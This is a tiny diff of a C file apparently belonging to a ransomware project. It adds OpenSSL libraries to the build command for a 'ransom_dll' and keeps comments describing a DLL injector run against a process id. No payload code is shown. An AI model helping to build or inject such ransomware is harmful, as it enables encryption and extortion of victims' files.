@@ -1,7 +1,7 @@
 #include <windows.h>
 #include "ransom.h"
 
-// gcc -shared -o ransom_dll.dll ransom_dll.c ransom.c
+// gcc -shared -o ransom_dll.dll ransom_dll.c ransom.c -lcrypto -lssl
 // gcc dll_injector.c -o dll_injector.exe
 // ./dll_injector.exe <path> <pid>
 
